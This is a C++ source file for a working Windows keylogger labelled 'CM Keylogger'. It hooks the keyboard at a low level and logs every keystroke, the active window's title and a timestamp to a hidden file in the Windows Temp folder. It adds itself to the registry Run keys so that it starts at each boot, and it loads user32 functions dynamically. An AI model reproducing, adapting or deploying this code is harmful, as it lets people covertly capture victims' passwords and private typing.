#include <windows.h>
#include <fstream>
#include <ctime>
#include <direct.h>
using namespace std;

/*
 ######  ##     ##    ##          ###    ########   ######
##    ## ###   ###    ##         ## ##   ##     ## ##    ##
##       #### ####    ##        ##   ##  ##     ## ##
##       ## ### ##    ##       ##     ## ########   ######
##       ##     ##    ##       ######### ##     ##       ##
##    ## ##     ##    ##       ##     ## ##     ## ##    ##
 ######  ##     ##    ######## ##     ## ########   ######
 
*/
char *ActiveWindow;
char *LastCapture;
char *Path;
bool Shift=false;
ofstream file;

typedef DWORD WINAPI (CALLBACK *ReadKey)(int vKey);
ReadKey Key;

typedef HWND WINAPI (CALLBACK *LastWindow)();
LastWindow GetW;

typedef int WINAPI (CALLBACK *GetTEXT)(HWND hwnd, LPTSTR lpString, int nMaxCount);
GetTEXT GetT;


LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);

LRESULT CALLBACK KeyLogg(int nCode, WPARAM wParam, LPARAM lParam) 
{
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);
    int c=0;
    
    
    if (wParam == WM_KEYUP)
    {
		if(p->vkCode==VK_LSHIFT || p->vkCode==VK_RSHIFT)
        {
            Shift=false;
        }
	}
		
    
    if (wParam == WM_KEYDOWN)
    {
		
		file.open(Path, ifstream::app);
		
		//State of Shift
        if(p->vkCode==VK_LSHIFT || p->vkCode==VK_RSHIFT)
        {
            Shift=true;
        }
        
        if(p->vkCode==VK_F6)
        {
            PostQuitMessage(0);
            file.close();
            
        }
        
        GetT(GetW(),ActiveWindow,100);
        
        
        
        
        while(ActiveWindow[c]!='\0')
        {
            if(ActiveWindow[c]!=LastCapture[c])
            {
				time_t rawtime;
				time(&rawtime);
				
				file << "\n\n["<<ActiveWindow<<"] - "<<ctime(&rawtime);
                break;
            }
            c++;
        }
        
        if(ActiveWindow[c]!='\0')
        {
            c=0;
            while(ActiveWindow[c]!='\0')
            {
                LastCapture[c]=ActiveWindow[c];
                c++;
            }
        }
        
        switch(p->vkCode)
        {
			case 8:
				file <<"[Back Space]";
			break;
			
			case 9:
				file <<"[Tab]";
			break;
			
			case 13:
				file <<"[Enter]";
			break;
			
			case 19:
				file <<"[Pause]";
			break;
			
			case 20:
				file <<"[Caps Lock]";
			break;
			
			case 27:
				file <<"[Esc]";
			break;
			
			case 32:
				file <<"[Space]";
			break;
			
			case 33:
				file <<"[Page Up]";
			break;
			
			case 34:
				file <<"[Page Down]";
			break;
			
			case 35:
				file <<"[End]";
			break;
			
			case 36:
				file <<"[Home]";
			break;
			
			case 37:
				file <<"[Left]";
			break;
			
			case 38:
				file <<"[Up]";
			break;
			
			case 39:
				file <<"[Rigth]";
			break;
			
			case 40:
				file <<"[Down]";
			break;
			
			case 44:
				file <<"[SysRq]";
			break;
			
			case 45:
				file <<"[Insert]";
			break;
			
			case 46:
				file <<"[Delete]";
			break;
			
			case 48:
				file <<"0";
			break;
			
			case 49:
				file <<"1";
			break;
			
			case 50:
				file <<"2";
			break;
			
			case 51:
				file <<"3";
			break;
			
			case 52:
				file <<"4";
			break;
			
			case 53:
				file <<"5";
			break;
			
			case 54:
				file <<"6";
			break;
			
			case 55:
				file <<"7";
			break;
			
			case 56:
				file <<"8";
			break;
			
			case 57:
				file <<"9";
			break;
			
			case 91:
				file <<"[Left Win]";
			break;
			
			case 92:
				file <<"[Rigth Win]";
			break;
			
			case 93:
				file <<"[App Menu]";
			break;
			
			case 96:
				file <<"[Num 0]";
			break;
			
			case 97:
				file <<"[Num 1]";
			break;
			
			case 98:
				file <<"[Num 2]";
			break;
			
			case 99:
				file <<"[Num 3]";
			break;
			
			case 100:
				file <<"[Num 4]";
			break;
			
			case 101:
				file <<"[Num 5]";
			break;
			
			case 102:
				file <<"[Num 6]";
			break;
			
			case 103:
				file <<"[Num 7]";
			break;
			
			case 104:
				file <<"[Num 8]";
			break;
			
			case 105:
				file <<"[Num 9]";
			break;
			
			case 106:
				file <<"[*]";
			break;
			
			case 107:
				file <<"[+]";
			break;
			
			case 109:
				file <<"[-]";
			break;
			
			case 110:
				file <<"[.]";
			break;
			
			case 111:
				file <<"[/]";
			break;
			
			case 112:
				file <<"[F1]";
			break;
			
			case 113:
				file <<"[F2]";
			break;
			
			case 114:
				file <<"[F3]";
			break;
			
			case 115:
				file <<"[F4]";
			break;
			
			case 116:
				file <<"[F5]";
			break;
			
			case 117:
				file <<"[F6]";
			break;
			
			case 118:
				file <<"[F7]";
			break;
			
			case 119:
				file <<"[F8]";
			break;
			
			case 120:
				file <<"[F9]";
			break;
			
			case 121:
				file <<"[F10]";
			break;
			
			case 122:
				file <<"[F11]";
			break;
			
			case 123:
				file <<"[F12]";
			break;
			
			case 144:
				file <<"[Bloq Num]";
			break;
			
			case 145:
				file <<"[Scroll]";
			break;
			
			case 160:
				file <<"[Left Shift]";
			break;
			
			case 161:
				file <<"[Rigth Shift]";
			break;
			
			case 162:
				file <<"[Left Ctrl]";
			break;
			
			case 163:
				file <<"[Rigth Ctrl]";
			break;
			case 186:
				file <<"[";
			break;
			
			case 187:
				file <<"]";
			break;
			
			case 188:
				file <<"[,]";
			break;
			
			case 189:
				file <<"[-]";
			break;
			
			case 190:
				file <<"[.]";
			break;
			
			case 191:
				file <<"[ç]";
			break;
			
			case 219:
				file <<"[\']";
			break;
			
			case 220:
				file <<"[º]";
			break;
			
			case 221:
				file <<"[¡]";
			break;
			
			case 222:
				file <<"[´]";
			break;
			
			case 226:
				file <<"[<]";
			break;
            
            default:
				if( (p->vkCode>=65 && p->vkCode<=90)  )
				{
					if( (((Key(VK_CAPITAL) & 0x0001)!=0) && Shift==false ) || ( ((Key(VK_CAPITAL) & 0x0001)==0) && Shift==true )  )
					{
						char text;
						text=p->vkCode;
						file << text;
					}
					else
					{
						char text;
						text=p->vkCode+32;
						file << text;
					}
				}
        }
        file.close();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Add_Regedit(char *value)
{
	HKEY Key;
	
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &Key)== ERROR_SUCCESS)
	{
		RegSetValueEx(Key,"CM Keylogger", 0, REG_SZ, (const BYTE*)value,strlen(value));
		RegCloseKey(Key);
	}
	else
	{
	    if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &Key)== ERROR_SUCCESS)
	    {
	    	RegSetValueEx(Key,"CM Keylogger", 0, REG_SZ, (const BYTE*)value,strlen(value));
	    	RegCloseKey(Key);
		}
	}
}

char *GetKeyboardLanguage()
{
	HKEY Key;
	char Name[100]={0};
	char *ID=(char*)malloc(100);
	char *LayoutPath=(char*)malloc(200);
	memset(LayoutPath,0,200);
	memset(ID,0,100);
	GetKeyboardLayoutName(ID);
	strcat(LayoutPath,"SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\");
	strcat(LayoutPath,ID);
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, LayoutPath, 0, KEY_ALL_ACCESS, &Key)== ERROR_SUCCESS)
	{
		DWORD dwSize=sizeof(Name), Type=REG_SZ;
		RegQueryValueEx(Key,"Layout Text",0,&Type,(LPBYTE)Name,&dwSize);
	    RegCloseKey(Key);
	}
	return (char*)Name;
}


int main(int argc, char**args)
{
    MSG messages;
    
    HINSTANCE hThisInstance = GetModuleHandle(NULL);
    
    ActiveWindow=(char*)malloc(MAX_PATH);
    memset(ActiveWindow,0,100);
    
    LastCapture=(char*)malloc(MAX_PATH);
    memset(LastCapture,0,100);
    
	HMODULE hIns=(HMODULE)LoadLibrary("user32.dll");
    if(hIns)
    {
        if(!(Key=(ReadKey)GetProcAddress(hIns,"GetKeyState"))){return 1;} 
        if(!(GetW=(LastWindow)GetProcAddress(hIns,"GetForegroundWindow"))){return 1;} 
        if(!(GetT=(GetTEXT)GetProcAddress(hIns,"GetWindowTextA"))){return 1;} 
    }
    
    Add_Regedit(args[0]);
    Path=(char*)malloc(300);
    memset(Path,0,300);
    GetWindowsDirectory(Path,300);
    strcat(Path,"\\Temp\\CM Logs");
    CreateDirectory(Path,NULL);
    SetFileAttributes(Path,FILE_ATTRIBUTE_HIDDEN);
    strcat(Path,"\\CM Logs.txt");
    file.open(Path, ifstream::app);
    
    file << "Keyboard Layout:\t" << GetKeyboardLanguage();
    file.close();
    memset(LastCapture,0,100);
    SetFileAttributes(Path,FILE_ATTRIBUTE_HIDDEN);
    
    
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,KeyLogg,hThisInstance,0);     
    
        
    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }
    return messages.wParam;
}


LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)                 
    {
        default:                      
            return DefWindowProc (hwnd, message, wParam, lParam);
    }

    return 0;
}



